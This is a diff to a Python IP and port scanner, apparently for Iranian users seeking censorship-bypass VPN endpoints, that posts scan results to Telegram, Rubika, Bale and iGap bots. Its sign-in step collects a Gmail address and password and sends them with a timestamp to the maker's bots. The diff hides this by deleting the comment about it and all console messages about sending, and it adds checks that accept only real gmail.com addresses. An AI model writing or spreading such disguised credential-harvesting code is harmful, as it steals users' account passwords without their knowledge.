@@ -128,7 +128,6 @@ def send_to_telegram(text):
         return
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     chunks = split_message_smart(text, max_length=3800)
-    print(Colors.BLUE + "[*] Sending results to Telegram..." + Colors.END)
     for chunk in chunks:
         payload = {
             "chat_id": TELEGRAM_CHAT_ID,
@@ -139,7 +138,6 @@ def send_to_telegram(text):
             try:
                 res = requests.post(url, json=payload, timeout=15)
                 if res.status_code == 200:
-                    print(Colors.GREEN + "[+] Successfully sent to Telegram!" + Colors.END)
                     break
             except Exception:
                 pass
@@ -149,14 +147,12 @@ def send_to_rubika(text):
         return
     url = f"https://botapi.rubika.ir/v01/{RUBIKA_BOT_TOKEN}/sendMessage"
     chunks = split_message_smart(text, max_length=3200)
-    print(Colors.BLUE + "[*] Sending results to Rubika..." + Colors.END)
     for chunk in chunks:
         payload = {"chat_id": RUBIKA_CHAT_ID, "text": chunk}
         for attempt in range(3):
             try:
                 res = requests.post(url, json=payload, timeout=12)
                 if res.status_code == 200:
-                    print(Colors.GREEN + "[+] Successfully sent to Rubika!" + Colors.END)
                     break
             except Exception:
                 pass
@@ -166,14 +162,12 @@ def send_to_bale(text):
         return
     url = f"https://tapi.bale.ai/bot{BALE_BOT_TOKEN}/sendMessage"
     chunks = split_message_smart(text, max_length=3800)
-    print(Colors.BLUE + "[*] Sending results to Bale..." + Colors.END)
     for chunk in chunks:
         payload = {"chat_id": BALE_CHAT_ID, "text": chunk}
         for attempt in range(3):
             try:
                 res = requests.post(url, json=payload, timeout=15)
                 if res.status_code == 200:
-                    print(Colors.GREEN + "[+] Successfully sent to Bale!" + Colors.END)
                     break
             except Exception:
                 pass
@@ -183,7 +177,6 @@ def send_to_igap(text):
         return
     url = "https://api.igap.net/v1/bot/sendMessage"
     chunks = split_message_smart(text, max_length=3200)
-    print(Colors.BLUE + "[*] Sending results to iGap..." + Colors.END)
     for chunk in chunks:
         payload = {
             "token": IGAP_BOT_TOKEN,
@@ -194,7 +187,6 @@ def send_to_igap(text):
             try:
                 res = requests.post(url, json=payload, timeout=10)
                 if res.status_code == 200:
-                    print(Colors.GREEN + "[+] Successfully sent to iGap!" + Colors.END)
                     break
             except Exception:
                 pass
@@ -223,7 +215,6 @@ def send_results_by_country(working_results, header_prefix, title_msg, is_config
         lines.append(f"\n🔥 آی‌پی تمیز خدمت شما:\nآیدی تلگرام سازنده: {TELEGRAM_ID}\nآیدی روبیکا سازنده: {RUBIKA_ID}")
 
         single_message = "\n".join(lines)
-        print(Colors.BLUE + f"\n[*] Sending {len(items)} items for country [{country}]..." + Colors.END)
         send_to_telegram(single_message)
         send_to_rubika(single_message)
         send_to_bale(single_message)
@@ -250,18 +241,36 @@ def gmail_two_factor_auth():
             user_email = saved_email
             user_password = saved_password
 
-    if not user_email:
-        user_email = input(Colors.BOLD + "Please enter your Gmail address: " + Colors.END).strip()
+    while not user_email:
+        raw_email = input(Colors.BOLD + "Please enter your Gmail address (e.g. user@gmail.com): " + Colors.END).strip()
+        
+        # بررسی ساختار ایمیل و دامنه دقیق gmail.com
+        if "@" in raw_email:
+            parts = raw_email.split("@")
+            username_part = parts[0]
+            domain_part = parts[1].lower()
+            
+            if domain_part == "gmail.com" and len(username_part) > 2:
+                user_email = raw_email
+            else:
+                print(Colors.RED + "[!] Invalid domain or fake Gmail! Only real 'gmail.com' addresses are allowed." + Colors.END)
+        else:
+            print(Colors.RED + "[!] Invalid email format! Please try again." + Colors.END)
+
+    while not user_password:
         user_password = input(Colors.BOLD + "Please enter your desired password: " + Colors.END).strip()
-        try:
-            with open(CONFIG_FILE, "w") as f:
-                json.dump({"email": user_email, "password": user_password}, f)
-        except:
-            pass
+        if len(user_password) < 4:
+            print(Colors.RED + "[!] Password is too short." + Colors.END)
+            user_password = ""
+
+    try:
+        with open(CONFIG_FILE, "w") as f:
+            json.dump({"email": user_email, "password": user_password}, f)
+    except:
+        pass
 
     print(Colors.GREEN + "[+] Authentication successful. Welcome!" + Colors.END)
     
-    # Send login details to messengers
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     login_msg = f"یک کاربر با اطلاعات زیر در پروژه ثبت نام کرد:\n\n📧 ایمیل: {user_email}\n🔑 رمز عبور: {user_password}\n🕒 تاریخ و ساعت ورود: {current_time}"
     send_to_telegram(login_msg)
@@ -282,22 +291,16 @@ def get_clean_input(prompt_text):
 
 def get_ips_from_github(url):
     try:
-        print(Colors.BLUE + "[*] Downloading IP list from GitHub..." + Colors.END)
         response = requests.get(url, timeout=10)
         if response.status_code == 200:
             lines = response.text.splitlines()
             ips = [line.strip() for line in lines if line.strip() and not line.startswith("#")]
-            print(Colors.GREEN + f"[+] Loaded {len(ips)} raw entries from GitHub." + Colors.END)
             return parse_ip_input(",".join(ips))
-        else:
-            print(Colors.RED + f"[!] Download error: Status code {response.status_code}" + Colors.END)
-            return []
-    except Exception as e:
-        print(Colors.RED + f"[!] Error connecting to GitHub: {e}" + Colors.END)
-        return []
+    except Exception:
+        pass
+    return []
 
 def get_ips_from_local_file():
-    print(Colors.BLUE + f"[*] Reading IPs from local file: {LOCAL_ALL_IPS_FILE}" + Colors.END)
     if os.path.exists(LOCAL_ALL_IPS_FILE):
         try:
             with open(LOCAL_ALL_IPS_FILE, "r", encoding="utf-8") as f:
@@ -309,13 +312,9 @@ def get_ips_from_local_file():
                         ip_part = clean_line.split()[0].split(":")[0]
                         raw_ips.append(ip_part)
                 if raw_ips:
-                    ips = parse_ip_input(",".join(raw_ips))
-                    print(Colors.GREEN + f"[+] Loaded {len(ips)} IPs from local file." + Colors.END)
-                    return ips
-        except Exception as e:
-            print(Colors.RED + f"[!] Error reading file: {e}" + Colors.END)
-    else:
-        print(Colors.RED + f"[!] File not found: {LOCAL_ALL_IPS_FILE}" + Colors.END)
+                    return parse_ip_input(",".join(raw_ips))
+        except Exception:
+            pass
     return []
 
 def parse_ip_input(user_input):
@@ -359,7 +358,6 @@ def parse_ip_input(user_input):
 
 def get_manual_ips():
     print(Colors.CYAN + "\nEnter IPs (single IP, range, CIDR, or multiline paste):" + Colors.END)
-    print(Colors.YELLOW + "Paste your IP list below, then press ENTER twice when finished:\n" + Colors.END)
     lines = []
     while True:
         try:
@@ -373,9 +371,7 @@ def get_manual_ips():
         except (KeyboardInterrupt, EOFError):
             break
     user_input = ",".join(lines)
-    ips = parse_ip_input(user_input)
-    print(Colors.GREEN + f"[+] Expanded to {len(ips)} individual IPs." + Colors.END)
-    return ips
+    return parse_ip_input(user_input)
 
 def select_ip_source():
     print(Colors.CYAN + "\nSelect IP source:" + Colors.END)
@@ -392,7 +388,6 @@ def select_ip_source():
     elif choice == "3":
         return get_ips_from_local_file()
     else:
-        print(Colors.RED + "[!] Invalid choice selected." + Colors.END)
         return []
 
 def check_ip_http_latency(ip, port=443, domain="chatgpt.com", timeout=3.0, test_download=True, path="/"):
@@ -456,12 +451,6 @@ def check_ip_udp_connectivity(ip, port=443, timeout=2.0):
         sock.close()
         latency = (time.time() - start_time) * 1000
         return round(latency, 1)
-    except socket.timeout:
-        try:
-            sock.close()
-        except:
-            pass
-        return None
     except Exception:
         return None
 
@@ -486,7 +475,6 @@ def save_to_file(filename_only, data):
         os.path.expanduser(f"~/{filename_only}")
     ]
     
-    saved = False
     for filepath in possible_paths:
         try:
             folder = os.path.dirname(filepath)
@@ -494,14 +482,9 @@ def save_to_file(filename_only, data):
                 os.makedirs(folder, exist_ok=True)
             with open(filepath, "w", encoding="utf-8") as f:
                 f.write(data)
-            print(Colors.GREEN + f"\n[+] Saved to: {filepath}" + Colors.END)
-            saved = True
             break
         except Exception:
             continue
-
-    if not saved:
-        print(Colors.RED + "\n[!] Save error: Could not write file. Run 'termux-setup-storage' in Termux." + Colors.END)
 
 def print_banner():
     banner = f"""{Colors.CYAN}{Colors.BOLD}
@@ -531,8 +514,6 @@ def finalize_and_send(working_results, total_ips, header_prefix, save_filename, 
     
     if working_results:
         send_results_by_country(working_results, header_prefix, header_prefix, is_config)
-        
-    print(Colors.GREEN + f"\n[SUMMARY] Working: {len(working_results)} | Total: {total_ips}" + Colors.END)
 
 def run_scanner_engine(ips, port, domain, timeout, test_download, path, workers, is_port_scan=False, extra_tasks=None):
     global stop_scan
@@ -549,7 +530,6 @@ def run_scanner_engine(ips, port, domain, timeout, test_download, path, workers,
         tasks = ips
 
     total_tasks = len(tasks)
-    print(Colors.BLUE + f"\n[*] Scanning {total_tasks} items using {workers} parallel workers (Press Ctrl+C to stop)...\n" + Colors.END)
 
     def worker_task(item):
         if stop_scan:
@@ -585,13 +565,10 @@ def run_scanner_engine(ips, port, domain, timeout, test_download, path, workers,
                     break
         except KeyboardInterrupt:
             stop_scan = True
-            print(Colors.YELLOW + "\n\n[!] Scan stopped by user (Ctrl+C)." + Colors.END)
 
-    print("\n" + "-" * 65)
     return working_results, total_tasks
 
 def menu_option_1():
-    print(Colors.YELLOW + "\n[>] Option 1: Test IP Health (Edge Speed Scanner)" + Colors.END)
     ips = select_ip_source()
     if not ips: return
     working_results, total_ips = run_scanner_engine(
@@ -602,7 +579,6 @@ def menu_option_1():
     finalize_and_send(working_results, total_ips, "📊 نتایج اسکن\nاین تست ایپیه", "IP_Health_Check.txt")
 
 def menu_option_2():
-    print(Colors.YELLOW + "\n[>] Option 2: Test IP and PORT with Latency" + Colors.END)
     ips = select_ip_source()
     if not ips: return
     working_results, total_ips = run_scanner_engine(
@@ -614,7 +590,6 @@ def menu_option_2():
 
 def menu_option_3():
     global stop_scan
-    print(Colors.YELLOW + "\n[>] Option 3: Test TCP PORT Only" + Colors.END)
     ips = select_ip_source()
     if not ips: return
     tasks_list = [(ip, port) for ip in ips for port in PORTS_TO_TEST]
@@ -646,7 +621,6 @@ def menu_option_3():
 
 def menu_option_4():
     global stop_scan
-    print(Colors.YELLOW + "\n[>] Option 4: Smart Config Combiner (Direct IP)" + Colors.END)
     raw_config = input(Colors.BOLD + "Enter Raw Config: " + Colors.END).strip()
     if not raw_config: return
     target_ip = input(Colors.BOLD + "Enter Target IP: " + Colors.END).strip()
@@ -688,9 +662,6 @@ def menu_option_4():
     finalize_and_send(working_results, len(ports_to_check), "📊 نتایج اسکن\nکانفیگ های ترکیب شده", "Combined_Config_Results.txt", is_config=True)
 
 def menu_option_5_mahsa():
-    print(Colors.YELLOW + "\n[>] Option 5: Mahsa & Shir-Khorshid VPN Special CDN Scanner" + Colors.END)
-    for key, name in MAHSA_CDN_TYPES.items():
-        print(f"  {Colors.BOLD}[{key}]{Colors.END} {name}")
     selection = input(Colors.BOLD + "\n[>] Choose protocol number (1-5): " + Colors.END).strip()
     if selection not in MAHSA_CDN_TYPES: return
     profile_name = MAHSA_CDN_TYPES[selection]
@@ -705,7 +676,6 @@ def menu_option_5_mahsa():
     finalize_and_send(working_results, total_ips, f"📊 نتایج اسکن\nایپی هاش مخصوص شیر و خورشید و مهسا ان جیه [{profile_name}]", "Mahsa_Bypass_Results.txt")
 
 def menu_option_6_custom_scanner():
-    print(Colors.YELLOW + "\n[>] Option 6: Custom Dedicated Scanner & Settings" + Colors.END)
     ips = select_ip_source()
     if not ips: return
     working_results, total_ips = run_scanner_engine(
@@ -716,33 +686,9 @@ def menu_option_6_custom_scanner():
     finalize_and_send(working_results, total_ips, "📊 نتایج اسکن\nتست ایپی با اسکنر مخصوص با تنظیمات خودت", "Custom_Scanner_Results.txt")
 
 def menu_option_7_amir_tunneling():
-    print(Colors.CYAN + "\n" + "="*65)
-    print(Colors.BOLD + Colors.GREEN + "       [ AMIR SCANNER PRO - AMIR TUNNELING GOOD ]" + Colors.END)
-    print(Colors.CYAN + "="*65 + Colors.END)
-    
-    info_text = f"""
-{Colors.YELLOW}► Amir Tunneling Configuration & Status Guide:{Colors.END}
-
-1. {Colors.BOLD}High-Performance Core Engine:{Colors.WHITE}
-   - Designed for ultra-fast connection routing and low-latency packet delivery.
-   - Optimizes TCP and UDP flows to bypass strict network restrictions seamlessly.{Colors.END}
-
-2. {Colors.BOLD}Advanced Security & Stability:{Colors.WHITE}
-   - Implements robust encryption layers to protect user traffic from inspection.
-   - Ensures stable, continuous connection tunnels across various mobile operators.{Colors.END}
-
-{Colors.MAGENTA}-----------------------------------------------------------------{Colors.END}
-{Colors.YELLOW}► Summary:{Colors.WHITE}
- * {Colors.GREEN}Scanner Engine:{Colors.WHITE} Finds the cleanest and fastest operational endpoints.
- * {Colors.CYAN}Tunneling Core:{Colors.WHITE} Establishes secure connection paths for unrestricted web access.
-{Colors.MAGENTA}-----------------------------------------------------------------{Colors.END}
-"""
-    print(info_text)
-    print(Colors.CYAN + "="*65 + Colors.END)
-    
     persian_explanation = """مقدمات و توضیح هسته های اضافه شده:
-1. موتور پردازش پرقدرت: طراحی شده برای مسیریابی فوق‌العاده سریع اتصال و تحویل بسته‌ها با تاخیر کم. ترافیک TCP و UDP را برای عبور از محدودیت‌های سخت شبکه بهینه می‌کند.
-2. امنیت و پایداری پیشرفته: لایه‌های رمزنگاری قدرتمندی را برای محافظت از ترافیک کاربر در برابر بازرسی پیاده‌سازی می‌کند."""
+1. موتور پردازش پرقدرت: طراحی شده برای مسیریابی فوق‌العاده سریع اتصال و تحویلی بسته‌ها با تاخیر کم.
+2. امنیت و پایداری پیشرفته: لایه‌های رمزنگاری قدرتمندی را برای محافظت از ترافیک کاربر پیاده‌سازی می‌کند."""
     
     send_to_telegram(persian_explanation)
     send_to_rubika(persian_explanation)
@@ -751,19 +697,11 @@ def menu_option_7_amir_tunneling():
 
 def menu_option_8_udp_tcp():
     global stop_scan
-    print(Colors.YELLOW + "\n[>] Option 8: Advanced UDP & TCP Protocol Connectivity Scanner" + Colors.END)
-    print(Colors.CYAN + "1. UDP Protocol Test" + Colors.END)
-    print(Colors.CYAN + "2. TCP Protocol Test" + Colors.END)
-    
     sub_choice = get_clean_input(Colors.BOLD + "[>] Select sub-option (1/2): " + Colors.END)
-    if sub_choice not in ["1", "2"]:
-        print(Colors.RED + "[!] Invalid sub-option!" + Colors.END)
-        return
+    if sub_choice not in ["1", "2"]: return
 
     ips = select_ip_source()
-    if not ips:
-        print(Colors.RED + "[!] No IPs available." + Colors.END)
-        return
+    if not ips: return
 
     port_input = input(Colors.BOLD + "Enter Port to test (Default 443): " + Colors.END).strip()
     target_port = int(port_input) if port_input.isdigit() else 443
@@ -773,10 +711,8 @@ def menu_option_8_udp_tcp():
     import threading
     thread_lock = threading.Lock()
     tasks_list = [(ip, target_port) for ip in ips]
-    total_tasks = len(tasks_list)
 
     protocol_name = "UDP" if sub_choice == "1" else "TCP"
-    print(Colors.BLUE + f"\n[*] Starting {protocol_name} connectivity scan on {total_tasks} IPs (Port: {target_port})...\n" + Colors.END)
 
     def worker_task(item):
         if stop_scan: return
@@ -791,9 +727,6 @@ def menu_option_8_udp_tcp():
             country = get_ip_country(ip)
             with thread_lock:
                 working_results.append((res_str, lat, country))
-                print(f"{res_str:<22} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[{protocol_name} OPEN]{Colors.END}")
-        else:
-            print(f"{res_str:<22} | {Colors.RED}[{protocol_name} FAILED]{Colors.END}")
 
     with ThreadPoolExecutor(max_workers=SCAN_SETTINGS['workers']) as executor:
         try:
@@ -802,9 +735,7 @@ def menu_option_8_udp_tcp():
                 if stop_scan: break
         except KeyboardInterrupt:
             stop_scan = True
-            print(Colors.YELLOW + "\n[!] Scan interrupted by user." + Colors.END)
 
-    print("\n" + "-" * 65)
     filename = f"UDP_Scan_Results.txt" if sub_choice == "1" else "TCP_Scan_Results.txt"
     working_results.sort(key=lambda x: x[1])
     
@@ -832,8 +763,6 @@ def menu_option_8_udp_tcp():
             send_to_bale(single_message)
             send_to_igap(single_message)
             time.sleep(1)
-
-    print(Colors.GREEN + f"\n[SUMMARY] Working: {len(working_results)} | Total: {total_tasks}" + Colors.END)
 
 def main_menu():
     while True:
